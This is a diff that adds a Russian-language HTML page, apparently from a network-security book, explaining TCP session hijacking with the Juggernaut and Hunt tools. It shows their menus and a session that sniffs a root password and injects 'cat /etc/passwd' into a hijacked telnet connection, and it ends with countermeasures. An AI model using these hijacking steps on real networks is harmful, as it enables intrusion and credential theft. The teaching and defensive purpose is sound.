@@ -1,0 +1,145 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+<head>
+<title></title>
+<meta http-equiv="Content-Type" content="text/html;charset=windows-1251">
+</head>
+<link rel="stylesheet" href="../STYLE.css">
+<body TEXT="#000000" BGCOLOR="#E7E3E7" LINK="#004080" VLINK="#004080" olink="#008080" Background="">
+<table BORDER=0   COLS=3 WIDTH="16%" >
+  <tr> 
+    <td><a href="Index1.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
+    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
+    <td ALIGN=RIGHT><a href="Index3.html"><img SRC="For.gif" BORDER=0 ></a></td>
+  </tr>
+</table>
+
+ 
+<br>
+<table width="100%" border="0">
+  <tr>
+    <td class="Text_n">
+ 
+<p class="Tit_CN">
+
+Захват сеанса</P>
+
+<p class="Text_n">
+Сетевые устройства поддерживают весь корпоративный поток сообщений. Каждое сообщение электронной почты, каждый файл, каждый номер кредитной карточки клиента передается по сети и обрабатывается этими устройствами. Очевидно, что обеспечение их безопасности является первоочередной задачей. Поэтому никогда нельзя исключать возможности, что сетевой трафик будет перехвачен злоумышленником. Ниже вы узнаете, как это можно осуществить с помощью так называемого захвата соединения TCP (TCP hijacking).
+<br>
+
+Такой подход стал возможным из-за наличия ошибок в протоколе TCP. Протоколы TCP/IP допускают внедрение в поток сообщений ложного пакета, позволяя тем самым запускать команды на удаленном узле. Однако этот тип взлома возможен только в сети с множественным доступом (этому вопросу посвящен раздел &quot;Множественный доступ и коммутация пакетов&quot; главы 10, &quot;Сетевые устройства&quot;), и для него нужно немного везения. С помощью программы Juggernaut или Hunt взломщик может попытаться &quot;подсмотреть&quot; передаваемые данные, а затем перехватить соединение.
+<br>
+<P align="center">
+<span class="Text_b">
+Juggernaut</span></P>
+<br>
+<p class="Text_n">
+Одна из первых попыток применить на практике теорию захвата TCP была предпринята Майком Шиффманом (Mike Schiffman), в результате чего появился продукт Juggernaut (возможно, многие вспомнят Майка по его предыдущей программе. Появление этого бесплатного программного продукта оказалось революционным в том отношении, что с его помощью можно было &quot;шпионить&quot; за соединением TCP, а затем на некоторое время его захватывать. Это позволило взломщикам вводить команды в качестве легитимного пользователя. Например, если сетевые устройства используются в сети с множественным доступом, то взломщики могут отслеживать соединения, а затем перехватить сеанс telnet или ввести пароль для устройств Cisco.
+<br>
+<p class="Code">
+Juggernaut<br>
+?) Help<br>
+0) Program information<br>
+1) Connection database<br>
+2) Spy on a connection<br>
+3) Reset a connection<br>
+4) Automated connection reset daemon<br>
+5) Simplex connection hijack<br>
+6) Interactive connection hijack<br>
+7) Packet assembly module<br>
+8) Souper sekret option number eight<br>
+9) Step Down<br>
+</p>
+
+Одной из лучших возможностей программы Juggernaut является функция simplex connection hijack (захват симплексного соединения). Эта возможность позволяет взломщику посылать команды в локальную систему. Применение режима interactive connection hijack (захват интерактивного соединения) всегда было затруднено, поскольку из-за большого потока сообщений АСК связь часто прерывалась. Однако зачастую возможности захвата симплексного соединения оказывается вполне достаточно. Она позволяет взломщику отправить, например, команду enable password О hello, которая выполнится на удаленном узле и отменит шифрование пароля.
+<br>
+<P align="center">
+<span class="Text_b">
+Hunt</span></P>
+<br>
+<p class="Text_n">
+Утилита Hunt (ее можно найти на Web-узле <span class="Text_b">http://www.cri.cz/-kra/index.html#HUNT</span>) — это еще одна программа перехвата, отличающаяся стабильностью работы. Ее автор, Павел Крауз (Pavel Krauz) создал замечательную программу, которая наглядно демонстрирует недостатки протокола TCP.
+<br>
+
+Как и Juggernaut, программа Hunt позволяет взломщику легко следить за соединением и, таким образом, выведывать такую ценную информацию, как пароли. Как это происходит, видно из следующего примера.
+<br>
+<p class="Code">
+--- Main Menu---rcvpkt 1498, free/alloc pkt 63/64 ---<br>
+1/w/r) list/watch/reset connections<br>
+u) host up tests<br>
+a) arp/simple hijack (avoids ack storm if arp used)<br>
+s) simple hijack<br>
+d) daemons rst/arp/sniff/mac<br>
+o) options<br>
+x) exit<br>
+&gt; <span class="Text_b">w</span><br>
+0) 172.29.11.207 [1038] -&gt; 172.30.52.69 [23]<br>
+1) 172.29.11.207 [1039] -&gt; 172.30.52.69 [23]<br>
+2) 172.29.11.207 [1040] -&gt; 172.30.52.66 [23]<br>
+3) 172.29.11.207 [1043] -&gt; 172.30.52.73 [23] <br>
+4} 172.29.11.207 [1045] -&gt; 172.30.52.74 [23]<br>
+5) 172.29.11.207 [1047] -&gt; 172.30.52.74 [23]<br>
+choose conn&gt; <span class="Text_b">2</span><br>
+dump [s]rc/[d]st/[b]oth [b]&gt; <span class="Text_b">s</span><br>
+CTRL-C to break<br>
+uname -a <span class="Text_b">su</span><br>
+hello<br>
+cat /etc/passwd<br>
+</p>
+
+В процессе наблюдения за сеансом telnet в системе UNIX взломщик может получить ценную информацию, например (как видно из предыдущего примера) пароль пользователя root. Утилита Hunt предоставляет также возможность передачи команд на удаленный узел и их выполнения. Например, взломщик может передавать команды, а результат их выполнения будет отображаться только на его компьютере, что в значительной мере затрудняет его обнаружение.
+<br>
+<p class="Code">
+---Main Menu--- rcvpkt 76, free/alloc pkt 63/64---<br>
+1/w/r) list/watch/reset connections u) host up tests<br>
+a)arp/simple hijack (avoids ack storm if arp used)<br>
+s)  simple hijack<br>
+d)  daemons rst/arp/sniff/mac <br>
+o)  options x)     exit &gt;<span class="Text_b"> s</span><br>
+0) 172.29.11.207 [1517]   --&gt; 192.168.40.66<br>
+[23] choose conn&gt;<span class="Text_b">0</span><br>
+ dump connection y/n [n]&gt;<span class="Text_b">n</span><br>
+ dump [s]rc/[d]st/[b]oth [b]&gt;<br>
+print src/dst same characters y/n [n]&gt;<br>
+Enter the command string you wish executed or [cr]&gt;<br>
+cat /etc/passwd cat /etc/passwd<br>
+root:rhayrl.AHfasd:0:1:Super-User:/:/sbin/sh daemon:x:<br>
+1:1::/: bin:x:2:2::/usr/bin: sys:x:3:3::/<br>
+:adm:x:4:4:Admin:/var/adm:<br>
+Ip:x:71:8:Line Printer Admin:/usr/spool/lp:<br>
+uucp:x:5:5:uucp Admin:/usr/lib/uucp:<br>
+nuucp:x:9:9:uucp Admin:/var/spool/uucppublic:/usr/lib/<br>
+uucp/uucicc listen:x:37:4:Network Admin:/usr/net/nls:<br>
+nobody:x:60001:60001:Nobody:/: noaccess:x:60002:60002:<br>
+No Access User:/: nobody4:x:65534:65534:SunOS 4.x Nobody:/:<br>
+sm:a401ja8fFla.;:100:1::/export/home/sm:/bin/sh<br>
+[r]eset connection/[s]ynchronize/[n]one [r]&gt;<span class="Text_b">n</span><br>
+done
+</p>
+
+Как видно из приведенного примера, на удаленный узел может быть передана довольно коварная команда (cat /etc/passwd), а полученный результат отобразится лишь на компьютере взломщика.
+<br>
+<P align="center">
+<span class="Text_b">
+Контрмеры против захвата соединений</span></P>
+<br>
+<p class="Text_n">
+Применение шифрующих коммуникационных протоколов, например IPSec или SSH, позволит значительно снизить или свести к нулю эффективность таких перехватов данных. Когда-то считалось, что технология сетей с коммутацией пакетов обеспечивает адекватную защиту от взломов подобного рода, но с тех пор средства сетевого мониторинга стали настолько хитроумными, что при определенных обстоятельствах они позволяют добиться желаемого результата (см. описание утилиты dsnif f в главе 8). Поэтому кодирование информации является самой лучшей защитой.
+<br>
+
+
+</p></td>
+  </tr>
+</table>
+<br>
+<table BORDER=0  COLS=3 WIDTH="11%" >
+  <tr> 
+   <td><a href="Index1.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
+    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
+    <td ALIGN=RIGHT><a href="Index3.html"><img SRC="For.gif" BORDER=0 ></a></td>
+   
+  </tr>
+</table>
+</body>
+</html>
